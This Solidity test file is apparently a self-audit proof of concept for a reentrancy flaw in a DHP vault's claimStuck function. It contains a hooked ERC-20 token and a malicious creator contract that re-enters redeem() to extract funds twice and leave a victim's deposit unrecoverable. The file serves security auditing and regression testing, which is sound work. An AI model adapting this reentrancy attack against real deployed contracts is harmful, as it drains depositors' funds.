// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/// @dev SELF-AUDIT V1.4.0 PoC — H-NEW-1: claimStuck cross-function reentrancy.
///      Demonstrates double extraction via a malicious CREATOR partner wallet
///      (any wallet can be a creator — free-market #27). Becomes the permanent
///      regression test after the fix lands (flipped to assert the attack
///      reverts).
import {Test} from "forge-std/Test.sol";
import {DHPImplementation} from "../../src/contracts/DHPImplementation.sol";
import {DHPFactory} from "../../src/contracts/DHPFactory.sol";
import {DHPFeeCollector} from "../../src/contracts/DHPFeeCollector.sol";

/// @notice ERC-20 that calls onTokenTransfer() on CONTRACT recipients
///         mid-transfer (ERC-777-style hook) — the reentry window.
contract HookedToken {
    string public name = "Hooked";
    string public symbol = "HOOK";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    /// @notice recipients whose failing hook reverts the transfer (attackers);
    ///         everyone else's hook failures are ignored (plain ERC-20 code
    ///         like the vault has no hook at all).
    mapping(address => bool) public strictRecipient;

    function setStrictRecipient(address who) external {
        strictRecipient[who] = true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        if (to.code.length > 0) {
            (bool ok, ) = to.call(abi.encodeWithSignature("onTokenTransfer(address,uint256)", msg.sender, amount));
            if (!ok && strictRecipient[to]) revert("HOOK: hook failed");
        }
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "HOOK: allowance");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        if (to.code.length > 0) {
            (bool ok, ) = to.call(abi.encodeWithSignature("onTokenTransfer(address,uint256)", from, amount));
            if (!ok && strictRecipient[to]) revert("HOOK: hook failed");
        }
        balanceOf[to] += amount;
        return true;
    }
}

/// @notice The malicious CREATOR partner. Phase 1 (greed=false): its hook
///         reverts, so the vault's _payPartner booking path kicks in and its
///         creator share is parked as stuck revenue. Phase 2 (greed=true):
///         the first hook call inside claimStuck's payout re-enters
///         redeem() with its LOCKED (not-yet-burned) shares.
contract EvilCreator {
    DHPFactory public immutable factory;
    bool public greed;
    bool public fired;

    constructor(DHPFactory factory_) {
        factory = factory_;
    }

    function setGreed(bool g) external {
        greed = g;
    }

    /// @notice msg.sender inside the hook IS the token that moved.
    function onTokenTransfer(address, uint256) external {
        if (!greed) revert("EvilCreator: refusing payout");
        if (fired) return; // stay passive on nested hook calls
        fired = true;
        address vault = factory.getVault(msg.sender);
        DHPImplementation(vault).redeem(
            DHPImplementation(vault).balanceOf(address(this)),
            address(this),
            address(this)
        );
    }
}

contract PoC_ClaimStuckReentrancy is Test {
    DHPImplementation implementation;
    DHPFactory factory;
    DHPFeeCollector collector;
    HookedToken token;

    address alice = makeAddr("alice");
    address platform = makeAddr("platform");

    function setUp() public {
        implementation = new DHPImplementation();
        collector = new DHPFeeCollector(makeAddr("treasury"));
        factory = new DHPFactory(address(implementation), address(collector), makeAddr("curator"), 0, 18);
        token = new HookedToken();
        vm.deal(address(this), 100 ether);
    }

    /// @dev The attack, end to end.
    function test_PoC_claimStuck_reentrancy_double_extraction() public {
        EvilCreator evil = new EvilCreator(factory);
        token.setStrictRecipient(address(evil)); // its hook refusal reverts transfers TO it
        DHPImplementation v = DHPImplementation(
            factory.createVault{value: 0.004 ether}(address(token), address(evil), platform)
        );

        // 2. The attacker makes the first deposit TO ITSELF (receiver = evil),
        //    so it holds the shares it will later double-dip on. Its creator
        //    partner payout attempt hits the hook, which reverts => 10e18
        //    (2% of the 500e18 entry tax) booked to stuckRevenue. The
        //    deposit itself succeeds (no DoS).
        token.mint(address(evil), 1_000_000e18);
        vm.prank(address(evil));
        token.approve(address(v), type(uint256).max);
        vm.prank(address(evil));
        v.deposit(10_000e18, address(evil));
        assertEq(v.stuckRevenue(address(evil)), 10e18, "stuck booked");
        assertTrue(v.totalSupply() > 0, "deposit succeeded");
        uint256 evilShares = v.balanceOf(address(evil)); // ~9500e18, LOCKED for now
        assertGt(evilShares, 0, "creator holds shares");
        assertGt(token.balanceOf(address(evil)), 0, "creator holds change from its own deposit");

        // 3. Arm the trap and let ANYONE trigger claimStuck.
        evil.setGreed(true);
        uint256 evilBalBefore = token.balanceOf(address(evil));
        v.claimStuck(address(evil));

        // 4. Inside the stuck payout's transfer hook, evil re-entered
        //    redeem() while its shares were still locked. It received:
        //    (a) the full redemption value of its shares at PRE-burn pricing
        //        (includes the 1e18 locked in burnedBalance — value that
        //        must never leave), and
        //    (b) the 10e18 stuck payout afterwards.
        //    Net balances prove double extraction:
        uint256 evilGained = token.balanceOf(address(evil)) - evilBalBefore;
        assertGt(evilGained, 10e18, "more than the stuck payout left the vault");
        assertEq(v.stuckRevenue(address(evil)), 0, "ledger cleared once - no infinite drain");

        // 5. The kill shot: backing is now insolvent. Alice's legitimate
        //    full redemption reverts (insolvent pricing / ERC20 underflow).
        uint256 aliceShares = v.balanceOf(alice);
        vm.prank(alice);
        vm.expectRevert();
        v.redeem(aliceShares, alice, alice);
    }

    /// @dev Variant B — the two-depositor insolvency: evil deposits first,
    ///      a VICTIM deposits second, then the trap fires. The reentrant
    ///      redeem lets evil exit at pre-burn pricing while the outer
    ///      claimStuck ledger updates land AFTER, double-counting the
    ///      stuck liability window. Prove the vault ends up unable to pay
    ///      the victim's full entitlement (freeze or shortfall).
    function test_PoC_variantB_victim_insolvency() public {
        EvilCreator evil = new EvilCreator(factory);
        token.setStrictRecipient(address(evil));
        DHPImplementation v = DHPImplementation(
            factory.createVault{value: 0.004 ether}(address(token), address(evil), platform)
        );

        // Evil seeds the vault (books its 10e18 creator share as stuck).
        token.mint(address(evil), 1_000_000e18);
        vm.startPrank(address(evil));
        token.approve(address(v), type(uint256).max);
        v.deposit(10_000e18, address(evil));
        vm.stopPrank();

        // Victim deposits the same size.
        token.mint(alice, 1_000_000e18);
        vm.prank(alice);
        token.approve(address(v), type(uint256).max);
        vm.prank(alice);
        v.deposit(10_000e18, alice);
        uint256 victimShares = v.balanceOf(alice);

        // Trap fires.
        evil.setGreed(true);
        uint256 evilBefore = token.balanceOf(address(evil));
        v.claimStuck(address(evil));
        uint256 evilGain = token.balanceOf(address(evil)) - evilBefore;
        emit log_named_uint("evil total extraction", evilGain);
        emit log_named_uint("victim shares", victimShares);
        emit log_named_uint("vault balance", token.balanceOf(address(v)));
        emit log_named_uint("burnedBalance", v.burnedBalance());
        emit log_named_uint("totalUnclaimed", v.totalUnclaimed());
        emit log_named_uint("totalStuckRevenue", v.totalStuckRevenue());

        // Does the vault still price at all?
        bool pricingReverts = false;
        uint256 assets = 0;
        try v.totalAssets() returns (uint256 a) {
            assets = a;
        } catch {
            pricingReverts = true;
        }
        emit log_named_uint("totalAssets", assets);
        assertTrue(pricingReverts || assets < v.burnedBalance() + v.totalUnclaimed() + victimShares,
            "victim must be impaired");
    }
}
